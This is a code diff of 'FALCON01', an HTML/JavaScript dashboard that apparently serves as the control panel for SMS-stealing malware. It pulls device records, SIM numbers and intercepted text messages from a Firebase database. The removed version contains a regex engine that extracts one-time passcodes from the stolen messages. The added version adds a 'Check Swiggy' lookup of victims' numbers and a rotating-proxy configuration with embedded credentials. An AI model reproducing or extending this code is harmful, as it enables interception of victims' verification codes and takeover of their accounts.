@@ -3,729 +3,233 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>FALCON01 · OTP Dashboard</title>
+    <title>FALCON01 · SMS Dashboard</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #0a0e14;
-            color: #e6edf3;
-            min-height: 100vh;
-            padding: 16px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0a0e14; color: #e6edf3; min-height: 100vh; padding: 16px;
         }
-        ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #161b22;
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #30363d;
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: #58a6ff;
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        /* ===== HEADER ===== */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #161b22; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #58a6ff; }
+        .container { max-width: 1400px; margin: 0 auto; }
         header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-            padding: 12px 20px;
-            background: #161b22;
-            border-radius: 12px;
-            border: 1px solid #30363d;
-            margin-bottom: 16px;
+            display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
+            gap: 12px; padding: 12px 20px; background: #161b22; border-radius: 12px;
+            border: 1px solid #30363d; margin-bottom: 16px;
         }
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+        .header-left { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
         .logo {
-            font-size: 22px;
-            font-weight: 700;
+            font-size: 22px; font-weight: 700;
             background: linear-gradient(135deg, #58a6ff, #3fb950);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
-        .logo-icon {
-            font-size: 28px;
+        .logo-icon { font-size: 28px; }
+        .feed-link {
+            text-decoration: none; background: #21262d; border: 1px solid #30363d;
+            padding: 6px 14px; border-radius: 6px; font-size: 13px; color: #58a6ff;
+            font-weight: 600; transition: 0.2s; display: inline-flex; align-items: center; gap: 4px;
         }
+        .feed-link:hover { border-color: #58a6ff; background: #1c2333; }
         .badge {
-            background: #21262d;
-            padding: 3px 12px;
-            border-radius: 16px;
-            font-size: 12px;
-            color: #8b949e;
-            display: flex;
-            align-items: center;
-            gap: 5px;
+            background: #21262d; padding: 3px 12px; border-radius: 16px;
+            font-size: 12px; color: #8b949e; display: flex; align-items: center; gap: 5px;
         }
-        .badge span {
-            color: #f0f6fc;
-            font-weight: 600;
+        .badge span { color: #f0f6fc; font-weight: 600; }
+        .header-actions { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+        .refresh-btn, .check-btn {
+            color: white; border: none; padding: 6px 16px; border-radius: 6px;
+            font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s;
+            display: flex; align-items: center; gap: 6px;
         }
-        .badge.otp {
-            border: 1px solid #f0883e;
-            color: #f0883e;
-        }
-        .badge.otp span {
-            color: #f0883e;
-        }
-        .header-actions {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .refresh-btn {
-            background: #238636;
-            color: white;
-            border: none;
-            padding: 6px 16px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .refresh-btn:hover {
-            background: #2ea043;
-            transform: scale(1.02);
-        }
-        .refresh-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .refresh-btn.spinning .icon {
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
+        .refresh-btn { background: #238636; }
+        .refresh-btn:hover { background: #2ea043; transform: scale(1.02); }
+        .check-btn { background: #1f6feb; }
+        .check-btn:hover { background: #388bfd; transform: scale(1.02); }
+        .refresh-btn:disabled, .check-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .refresh-btn.spinning .icon { animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .ws-status {
-            font-size: 11px;
-            padding: 3px 12px;
-            border-radius: 16px;
-            background: #21262d;
-            border: 1px solid #30363d;
-            display: flex;
-            align-items: center;
-            gap: 5px;
+            font-size: 11px; padding: 3px 12px; border-radius: 16px;
+            background: #21262d; border: 1px solid #30363d; display: flex; align-items: center; gap: 5px;
         }
-        .ws-status.online {
-            color: #3fb950;
-            border-color: #3fb950;
+        .ws-status.online { color: #3fb950; border-color: #3fb950; }
+        .ws-status.offline { color: #f85149; border-color: #f85149; }
+        .progress-container {
+            display: none; width: 100%; align-items: center; gap: 12px;
+            background: #161b22; border: 1px solid #30363d; padding: 8px 16px; border-radius: 8px; margin-bottom: 16px;
         }
-        .ws-status.offline {
-            color: #f85149;
-            border-color: #f85149;
-        }
-
-        /* ===== STATS BAR ===== */
-        .stats-bar {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-        .stat-card {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 10px;
-            padding: 12px 16px;
-            transition: border-color 0.2s;
-            position: relative;
-            overflow: hidden;
-        }
-        .stat-card.otp-stat {
-            border-color: #f0883e;
-        }
-        .stat-card.otp-stat .stat-value {
-            color: #f0883e;
-        }
-        .stat-card .stat-icon {
-            font-size: 18px;
-            margin-right: 6px;
-        }
-        .stat-label {
-            font-size: 10px;
-            color: #8b949e;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .stat-value {
-            font-size: 20px;
-            font-weight: 600;
-            margin-top: 2px;
-            color: #f0f6fc;
-        }
-        .stat-value .sub {
-            font-size: 12px;
-            font-weight: 400;
-            color: #8b949e;
-        }
-
-        /* ===== FILTERS ===== */
-        .filters {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 16px;
-            padding: 12px 16px;
-            background: #161b22;
-            border-radius: 10px;
-            border: 1px solid #30363d;
-        }
-        .filter-group {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            flex: 1;
-            min-width: 140px;
-        }
-        .filter-group label {
-            font-size: 12px;
-            color: #8b949e;
-            white-space: nowrap;
-        }
-        .filter-group input,
-        .filter-group select {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 5px 10px;
-            color: #e6edf3;
-            font-size: 12px;
-            width: 100%;
-            transition: border-color 0.2s;
-        }
-        .filter-group input:focus,
-        .filter-group select:focus {
-            outline: none;
-            border-color: #58a6ff;
-        }
-
-        /* ===== DEVICE GRID ===== */
-        .devices-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 12px;
-        }
-        .device-card {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 10px;
-            padding: 16px;
-            transition: all 0.2s;
-            cursor: pointer;
-            position: relative;
-        }
-        .device-card:hover {
-            border-color: #58a6ff;
-            transform: translateY(-3px);
-            box-shadow: 0 4px 16px rgba(88, 166, 255, 0.08);
-        }
-        .device-card .device-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 8px;
-        }
-        .device-id {
-            font-size: 10px;
-            color: #8b949e;
-            font-family: monospace;
-            background: #0d1117;
-            padding: 2px 8px;
-            border-radius: 4px;
-            word-break: break-all;
-            max-width: 60%;
-        }
-        .device-status {
-            font-size: 10px;
-            padding: 2px 8px;
-            border-radius: 10px;
-            background: #21262d;
-        }
-        .device-status.online {
-            color: #3fb950;
-        }
-        .device-status.offline {
-            color: #8b949e;
-        }
-
-        .device-model {
-            font-size: 16px;
-            font-weight: 600;
-            color: #f0f6fc;
-            margin-bottom: 2px;
-        }
-        .device-brand {
-            font-size: 13px;
-            color: #8b949e;
-            margin-bottom: 8px;
-        }
-        .device-numbers {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 4px;
-            margin: 6px 0 10px;
-        }
-        .device-number {
-            background: #1c2333;
-            padding: 2px 10px;
-            border-radius: 10px;
-            font-size: 11px;
-            font-weight: 500;
-            color: #58a6ff;
-            font-family: monospace;
-            border: 1px solid #30363d;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .device-number .otp-badge {
-            font-size: 8px;
-            background: #f0883e;
-            color: #0a0e14;
-            padding: 0 4px;
-            border-radius: 3px;
-            font-weight: 700;
-        }
-        .device-stats {
-            display: flex;
-            gap: 12px;
-            font-size: 12px;
-            color: #8b949e;
-            padding-top: 8px;
-            border-top: 1px solid #21262d;
-            flex-wrap: wrap;
-        }
-        .device-stats .count {
-            color: #f0f6fc;
-            font-weight: 600;
-        }
-        .device-stats .otp-count {
-            color: #f0883e;
-            font-weight: 600;
-        }
-
-        /* ===== OTP HIGHLIGHT ===== */
-        .otp-highlight {
-            background: #1a1f2e;
-            border: 1px solid #f0883e;
-            border-radius: 6px;
-            padding: 8px 12px;
-            margin-top: 8px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 6px;
-        }
-        .otp-highlight .code {
-            font-size: 18px;
-            font-weight: 700;
-            color: #f0883e;
-            font-family: monospace;
-            letter-spacing: 2px;
-        }
-        .otp-highlight .from {
-            font-size: 11px;
-            color: #8b949e;
-        }
-        .otp-highlight .time {
-            font-size: 10px;
-            color: #8b949e;
-        }
-
-        /* ===== LOADING ===== */
-        .loading {
-            text-align: center;
-            padding: 60px 20px;
-            color: #8b949e;
-        }
-        .spinner {
-            display: inline-block;
-            width: 36px;
-            height: 36px;
-            border: 3px solid #21262d;
-            border-top: 3px solid #58a6ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 12px;
-        }
-        .no-data {
-            text-align: center;
-            padding: 60px 20px;
-            color: #8b949e;
-        }
-        .no-data .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-            opacity: 0.3;
-        }
-
-        /* ===== TOAST ===== */
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%) translateY(80px);
-            background: #21262d;
-            color: #f0f6fc;
-            padding: 10px 24px;
-            border-radius: 10px;
-            font-size: 13px;
-            border: 1px solid #30363d;
-            opacity: 0;
-            transition: all 0.3s ease;
-            pointer-events: none;
-            z-index: 999;
-            backdrop-filter: blur(10px);
-        }
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-
-        /* ===== RESPONSIVE ===== */
+        .progress-container.active { display: flex; }
+        .progress-bar-mini { flex: 1; height: 6px; background: #21262d; border-radius: 3px; overflow: hidden; }
+        .progress-fill-mini { height: 100%; width: 0%; background: linear-gradient(90deg, #58a6ff, #3fb950); transition: width 0.2s; }
+        .progress-text-mini { font-size: 12px; color: #8b949e; font-family: monospace; }
+        .stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px; margin-bottom: 16px; }
+        .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 12px 16px; }
+        .stat-label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
+        .stat-value { font-size: 20px; font-weight: 600; margin-top: 2px; color: #f0f6fc; }
+        .filters { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 16px; padding: 12px 16px; background: #161b22; border-radius: 10px; border: 1px solid #30363d; }
+        .filter-group { display: flex; align-items: center; gap: 6px; flex: 1; min-width: 140px; }
+        .filter-group label { font-size: 12px; color: #8b949e; }
+        .filter-group input, .filter-group select { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 5px 10px; color: #e6edf3; font-size: 12px; width: 100%; }
+        .filter-group input:focus, .filter-group select:focus { outline: none; border-color: #58a6ff; }
+        .devices-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
+        .device-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 16px; transition: all 0.2s; cursor: pointer; position: relative; }
+        .device-card:hover { border-color: #58a6ff; transform: translateY(-3px); box-shadow: 0 4px 16px rgba(88, 166, 255, 0.08); }
+        .device-card .device-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px; }
+        .device-id { font-size: 10px; color: #8b949e; font-family: monospace; background: #0d1117; padding: 2px 8px; border-radius: 4px; word-break: break-all; max-width: 70%; }
+        .device-status { font-size: 10px; padding: 2px 8px; border-radius: 10px; background: #21262d; }
+        .device-status.online { color: #3fb950; }
+        .device-status.offline { color: #8b949e; }
+        .device-model { font-size: 16px; font-weight: 600; color: #f0f6fc; }
+        .device-brand { font-size: 13px; color: #8b949e; margin-bottom: 8px; }
+        .device-numbers { display: flex; flex-wrap: wrap; gap: 4px; margin: 6px 0 10px; }
+        .device-number { background: #1c2333; padding: 2px 10px; border-radius: 10px; font-size: 11px; font-weight: 500; color: #58a6ff; font-family: monospace; border: 1px solid #30363d; }
+        .swiggy-status { font-size: 11px; padding: 2px 8px; border-radius: 6px; font-weight: 600; margin-left: auto; }
+        .swiggy-status.registered { background: rgba(63, 185, 80, 0.15); color: #3fb950; }
+        .swiggy-status.not-registered { background: rgba(248, 81, 73, 0.15); color: #f85149; }
+        .swiggy-status.checking { background: rgba(216, 141, 47, 0.15); color: #db8e2f; }
+        .device-stats { display: flex; align-items: center; gap: 12px; font-size: 12px; color: #8b949e; padding-top: 8px; border-top: 1px solid #21262d; }
+        .device-stats .count { color: #f0f6fc; font-weight: 600; }
+        .loading { text-align: center; padding: 60px 20px; color: #8b949e; }
+        .spinner { display: inline-block; width: 36px; height: 36px; border: 3px solid #21262d; border-top: 3px solid #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 12px; }
+        .no-data { text-align: center; padding: 60px 20px; color: #8b949e; }
+        .no-data .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.3; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(80px); background: #21262d; color: #f0f6fc; padding: 10px 24px; border-radius: 10px; font-size: 13px; border: 1px solid #30363d; opacity: 0; transition: all 0.3s; z-index: 999; }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .cache-info { font-size: 10px; color: #8b949e; padding: 4px 12px; background: #0d1117; border-radius: 4px; border: 1px solid #21262d; }
         @media (max-width: 768px) {
-            body {
-                padding: 10px;
-            }
-            header {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .header-left {
-                justify-content: center;
-                flex-wrap: wrap;
-            }
-            .header-actions {
-                justify-content: center;
-            }
-            .stats-bar {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            .devices-grid {
-                grid-template-columns: 1fr;
-            }
-            .filters {
-                flex-direction: column;
-            }
-            .filter-group {
-                min-width: unset;
-            }
-        }
-        @media (max-width: 480px) {
-            .stats-bar {
-                grid-template-columns: 1fr;
-            }
-            .logo {
-                font-size: 18px;
-            }
+            header { flex-direction: column; align-items: stretch; }
+            .header-left, .header-actions { justify-content: center; }
+            .stats-bar { grid-template-columns: repeat(2, 1fr); }
+            .devices-grid { grid-template-columns: 1fr; }
+            .filters { flex-direction: column; }
         }
     </style>
 </head>
 <body>
-
     <div class="container">
         <div id="toast" class="toast">✅ Done!</div>
-
-        <!-- ===== HEADER ===== -->
         <header>
             <div class="header-left">
                 <span class="logo-icon">📡</span>
                 <span class="logo">FALCON01</span>
+                <a href="all-sms.html" class="feed-link">📨 All SMS Feed</a>
                 <div style="display:flex;gap:6px;flex-wrap:wrap;">
                     <span class="badge">📱 <span id="deviceCount">0</span></span>
                     <span class="badge">💬 <span id="totalSmsCount">0</span></span>
-                    <span class="badge otp">🔐 OTP <span id="totalOtpCount">0</span></span>
+                    <span class="cache-info" id="cacheInfo">⚡ Cache</span>
                 </div>
             </div>
             <div class="header-actions">
+                <button class="check-btn" id="checkSwiggyBtn" onclick="startSwiggyCheck()">🔍 Check Swiggy</button>
                 <span class="ws-status" id="wsStatus">⚡ connecting…</span>
-                <button class="refresh-btn" id="refreshBtn">
-                    <span class="icon">⟳</span> Refresh
-                </button>
+                <button class="refresh-btn" id="refreshBtn"><span class="icon">⟳</span> Refresh</button>
             </div>
         </header>
 
-        <!-- ===== STATS ===== -->
+        <div class="progress-container" id="progressContainer">
+            <span class="progress-text-mini" id="progressTextMini">0/0</span>
+            <div class="progress-bar-mini"><div class="progress-fill-mini" id="progressFillMini"></div></div>
+        </div>
+
         <div class="stats-bar">
-            <div class="stat-card">
-                <div class="stat-label">📱 Devices</div>
-                <div class="stat-value" id="statDevices">0</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">💬 Total SMS</div>
-                <div class="stat-value" id="statSms">0</div>
-            </div>
-            <div class="stat-card otp-stat">
-                <div class="stat-label">🔐 OTP Codes</div>
-                <div class="stat-value" id="statOtp">0</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">📞 Numbers</div>
-                <div class="stat-value" id="statNumbers">0</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">⏱️ Last Update</div>
-                <div class="stat-value" id="statLastUpdate" style="font-size:13px;">—</div>
-            </div>
+            <div class="stat-card"><div class="stat-label">Devices</div><div class="stat-value" id="statDevices">0</div></div>
+            <div class="stat-card"><div class="stat-label">Total SMS</div><div class="stat-value" id="statSms">0</div></div>
+            <div class="stat-card"><div class="stat-label">Unique Numbers</div><div class="stat-value" id="statNumbers">0</div></div>
+            <div class="stat-card"><div class="stat-label">Last Update</div><div class="stat-value" id="statLastUpdate" style="font-size:13px;">—</div></div>
         </div>
 
-        <!-- ===== FILTERS ===== -->
         <div class="filters">
-            <div class="filter-group">
-                <label>🔍</label>
-                <input type="text" id="searchInput" placeholder="Search devices or numbers..." />
-            </div>
-            <div class="filter-group">
-                <label>📊</label>
-                <select id="sortSelect">
-                    <option value="newest">Newest</option>
-                    <option value="oldest">Oldest</option>
-                    <option value="mostSms">Most SMS</option>
-                    <option value="mostOtp">Most OTP</option>
-                </select>
-            </div>
-            <div class="filter-group" style="flex:0.5;min-width:100px;">
-                <label>🔐</label>
-                <select id="otpFilter">
-                    <option value="all">All</option>
-                    <option value="hasOtp">Has OTP</option>
-                    <option value="noOtp">No OTP</option>
-                </select>
-            </div>
+            <div class="filter-group"><label>🔍</label><input type="text" id="searchInput" placeholder="Search devices..." /></div>
+            <div class="filter-group"><label>📊</label><select id="sortSelect"><option value="newest">Newest</option><option value="oldest">Oldest</option><option value="mostSms">Most SMS</option><option value="leastSms">Least SMS</option></select></div>
         </div>
 
-        <!-- ===== LIST VIEW ===== -->
         <div id="listView">
-            <div id="loadingIndicator" class="loading" style="display:none;">
-                <div class="spinner"></div>
-                <p>Loading devices...</p>
-            </div>
+            <div id="loadingIndicator" class="loading"><div class="spinner"></div><p>Loading devices...</p></div>
             <div id="devicesGrid" class="devices-grid"></div>
-            <div id="noData" class="no-data" style="display:none;">
-                <div class="icon">📭</div>
-                <p>No devices found</p>
-            </div>
+            <div id="noData" class="no-data" style="display:none;"><div class="icon">📭</div><p>No devices found</p></div>
         </div>
     </div>
 
     <script>
-        // ============================================================
-        // FALCON01 - OPTIMIZED WITH OTP DETECTION
-        // ============================================================
         const DB_URL = 'https://fortydata-fee65-default-rtdb.firebaseio.com/admin/FALCON01/users.json';
+        const WS_URL = 'wss://echo.websocket.org';
         const CACHE_KEY = 'falcon01_cache';
         const CACHE_DURATION = 30000;
-        const MAX_SMS_TO_SHOW = 5;
+        const MAX_SMS_TO_SHOW = 15;
 
-        // ============================================================
-        // STATE
-        // ============================================================
+        const PROXY_CONFIG = { proxyUrl: 'http://gwrwqbct-rotate:ufq4kbbomien@p.webshare.io:80', useProxy: true };
+
         let devices = [];
         let filteredDevices = [];
         let isFirstLoad = true;
+        let ws = null;
+        let reconnectTimer = null;
         let lastUpdate = null;
         let isLoading = false;
-        let otpCache = {};
+        let swiggyStatusMap = {};
+        let isCheckingSwiggy = false;
 
-        // ============================================================
-        // DOM REFS
-        // ============================================================
         const $ = (s) => document.querySelector(s);
         const grid = $('#devicesGrid');
         const loading = $('#loadingIndicator');
         const noData = $('#noData');
         const deviceCount = $('#deviceCount');
         const totalSmsCount = $('#totalSmsCount');
-        const totalOtpCount = $('#totalOtpCount');
         const statDevices = $('#statDevices');
         const statSms = $('#statSms');
-        const statOtp = $('#statOtp');
         const statNumbers = $('#statNumbers');
         const statLastUpdate = $('#statLastUpdate');
         const searchInput = $('#searchInput');
         const sortSelect = $('#sortSelect');
-        const otpFilter = $('#otpFilter');
         const refreshBtn = $('#refreshBtn');
         const wsStatus = $('#wsStatus');
+        const cacheInfo = $('#cacheInfo');
         const toast = $('#toast');
 
-        // ============================================================
-        // OTP DETECTION ENGINE
-        // ============================================================
-        const OTP_PATTERNS = [
-            // 4-8 digit OTP codes
-            /\b(\d{4,8})\b/g,
-            // OTP with labels
-            /OTP[:\s]*(\d{4,8})/gi,
-            /verification code[:\s]*(\d{4,8})/gi,
-            /code[:\s]*(\d{4,8})/gi,
-            /one[- ]time password[:\s]*(\d{4,8})/gi,
-            /your (?:one[- ]time )?password[:\s]*(\d{4,8})/gi,
-            // Indian OTP patterns
-            /[\d]{4,8}(?:\s+is\s+your\s+(?:OTP|code))/gi,
-            /(?:OTP|code)\s*(?:is|:)\s*(\d{4,8})/gi,
-            /(\d{4,8})\s*(?:is\s+your\s+(?:OTP|verification\s+code))/gi,
-            /(\d{4,8})/g
-        ];
-
-        function detectOTP(text) {
-            if (!text) return null;
-            const cleaned = text.replace(/\s+/g, ' ').trim();
-            let bestMatch = null;
-            let bestLength = 0;
-
-            for (const pattern of OTP_PATTERNS) {
-                let match;
-                const regex = new RegExp(pattern.source, pattern.flags);
-                while ((match = regex.exec(cleaned)) !== null) {
-                    const code = match[1] || match[0];
-                    // Only accept 4-8 digit numbers
-                    if (/^\d{4,8}$/.test(code)) {
-                        const len = code.length;
-                        if (len > bestLength) {
-                            bestLength = len;
-                            bestMatch = code;
-                        }
-                    }
-                }
-            }
-
-            return bestMatch;
-        }
-
-        function processMessagesForOTP(messages) {
-            const otps = [];
-            const uniqueOtps = new Set();
-            let latestOtp = null;
-
-            for (const msg of messages) {
-                const otp = detectOTP(msg.message);
-                if (otp) {
-                    const entry = {
-                        code: otp,
-                        sender: msg.sender || 'Unknown',
-                        timestamp: msg.timestamp || Date.now(),
-                        message: msg.message
-                    };
-                    otps.push(entry);
-                    if (!uniqueOtps.has(otp)) {
-                        uniqueOtps.add(otp);
-                        latestOtp = entry;
-                    }
-                }
-            }
-
-            return { otps, uniqueCount: uniqueOtps.size, latestOtp };
-        }
-
-        // ============================================================
-        // CACHE HELPERS
-        // ============================================================
         function getCache() {
             try {
                 const data = localStorage.getItem(CACHE_KEY);
                 if (data) {
                     const parsed = JSON.parse(data);
-                    if (parsed && parsed.timestamp && (Date.now() - parsed.timestamp) < CACHE_DURATION) {
-                        return parsed.devices;
-                    }
+                    if (parsed && parsed.timestamp && (Date.now() - parsed.timestamp) < CACHE_DURATION) return parsed.devices;
                 }
-            } catch (e) { /* ignore */ }
+            } catch (e) {}
             return null;
         }
 
         function setCache(devices) {
-            try {
-                localStorage.setItem(CACHE_KEY, JSON.stringify({
-                    devices: devices,
-                    timestamp: Date.now()
-                }));
-            } catch (e) { /* ignore */ }
+            try { localStorage.setItem(CACHE_KEY, JSON.stringify({ devices: devices, timestamp: Date.now() })); } catch (e) {}
         }
 
-        // ============================================================
-        // HELPERS
-        // ============================================================
         function formatTimestamp(ts) {
             if (!ts) return '—';
-            const d = new Date(ts);
-            return d.toLocaleString('en-IN', {
-                day: '2-digit',
-                month: 'short',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: true
-            });
-        }
-
-        function formatTime(ts) {
-            if (!ts) return '—';
-            const d = new Date(ts);
-            return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+            return new Date(ts).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
         }
 
         function extractNumbers(simInfo) {
             const nums = new Set();
             if (!simInfo) return [];
             ['sim1', 'sim2'].forEach(slot => {
-                const sim = simInfo[slot];
-                if (sim?.number) {
-                    let n = sim.number.trim().replace(/^\+?91/, '');
-                    if (n) nums.add(n);
+                if (simInfo[slot]?.number) {
+                    let n = simInfo[slot].number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
+                    if (n && n.length >= 10) nums.add(n);
                 }
             });
             if (simInfo.number) {
-                let n = simInfo.number.trim().replace(/^\+?91/, '');
-                if (n) nums.add(n);
+                let n = simInfo.number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
+                if (n && n.length >= 10) nums.add(n);
             }
             return Array.from(nums);
         }
 
-        function getMessageCount(userData) {
-            return userData.receivedSms ? Object.keys(userData.receivedSms).length : 0;
-        }
+        function getMessageCount(userData) { return userData.receivedSms ? Object.keys(userData.receivedSms).length : 0; }
 
         function getLastMessages(userData, limit = MAX_SMS_TO_SHOW) {
             if (!userData.receivedSms) return [];
-            const msgs = [];
-            for (const [key, sms] of Object.entries(userData.receivedSms)) {
-                msgs.push({ id: key, ...sms });
-            }
+            const msgs = Object.entries(userData.receivedSms).map(([key, sms]) => ({ id: key, ...sms }));
             msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
             return msgs.slice(0, limit);
         }
@@ -738,293 +242,162 @@
         }
 
         function showToast(msg) {
-            toast.textContent = msg;
-            toast.classList.add('show');
+            toast.textContent = msg; toast.classList.add('show');
             clearTimeout(toast._timer);
             toast._timer = setTimeout(() => toast.classList.remove('show'), 1500);
         }
 
-        // ============================================================
-        // FETCH DATA
-        // ============================================================
         async function fetchData(force = false) {
             if (isLoading) return;
             isLoading = true;
-
             if (!force) {
                 const cached = getCache();
                 if (cached && cached.length > 0) {
-                    devices = cached;
-                    applyFiltersAndRender();
-                    updateStats();
-                    isLoading = false;
-                    fetchData(true);
-                    return;
+                    devices = cached; applyFiltersAndRender(); updateStats();
+                    cacheInfo.textContent = '📦 Cache'; cacheInfo.style.color = '#3fb950';
+                    isLoading = false; fetchData(true); return;
                 }
             }
-
-            if (isFirstLoad) {
-                loading.style.display = 'block';
-                grid.style.display = 'none';
-            }
-
-            refreshBtn.disabled = true;
-            refreshBtn.classList.add('spinning');
-
+            if (isFirstLoad) { loading.style.display = 'block'; grid.style.display = 'none'; }
+            refreshBtn.disabled = true; refreshBtn.classList.add('spinning');
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 5000);
-
-                const resp = await fetch(DB_URL, {
-                    signal: controller.signal,
-                    headers: { 'Cache-Control': 'no-cache' }
-                });
-
+                const resp = await fetch(DB_URL, { signal: controller.signal, headers: { 'Cache-Control': 'no-cache' } });
                 clearTimeout(timeoutId);
-
                 if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                 const data = await resp.json();
-
                 const newDevices = [];
                 if (data && typeof data === 'object') {
-                    const keys = Object.keys(data);
-                    const chunkSize = 10;
-                    for (let i = 0; i < keys.length; i += chunkSize) {
-                        const chunk = keys.slice(i, i + chunkSize);
-                        for (const id of chunk) {
-                            const user = data[id];
-                            if (user?.deviceInfo) {
-                                const msgs = getLastMessages(user);
-                                const otpResult = processMessagesForOTP(msgs);
-                                newDevices.push({
-                                    id,
-                                    data: user,
-                                    msgCount: getMessageCount(user),
-                                    numbers: extractNumbers(user.simInfo),
-                                    recentMessages: msgs,
-                                    otpData: otpResult,
-                                    hasOtp: otpResult.uniqueCount > 0
-                                });
-                            }
+                    for (const id of Object.keys(data)) {
+                        const user = data[id];
+                        if (user?.deviceInfo) {
+                            newDevices.push({ id, data: user, msgCount: getMessageCount(user), numbers: extractNumbers(user.simInfo), recentMessages: getLastMessages(user) });
                         }
-                        await new Promise(r => setTimeout(r, 0));
                     }
                 }
-
                 newDevices.sort((a, b) => (b.data.userCreated || 0) - (a.data.userCreated || 0));
-                devices = newDevices;
-                lastUpdate = Date.now();
-
-                setCache(devices);
-
-                applyFiltersAndRender();
-                updateStats();
-
-                if (isFirstLoad) isFirstLoad = false;
-
-            } catch (err) {
-                console.error('Fetch error:', err);
-                if (!getCache()) {
-                    grid.style.display = 'block';
-                    grid.innerHTML = `
-                        <div style="grid-column:1/-1; text-align:center; padding:40px; color:#f85149;">
-                            <p style="font-size:16px;">⚠️ Failed to load</p>
-                            <p style="color:#8b949e; font-size:13px; margin-top:6px;">${err.message}</p>
-                            <button onclick="fetchData(true)" style="margin-top:12px;padding:6px 20px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer;">Retry</button>
-                        </div>
-                    `;
-                }
-                showToast('❌ Error: ' + err.message);
-            } finally {
-                isLoading = false;
-                refreshBtn.disabled = false;
-                refreshBtn.classList.remove('spinning');
-                loading.style.display = 'none';
-                grid.style.display = 'grid';
-            }
+                devices = newDevices; lastUpdate = Date.now();
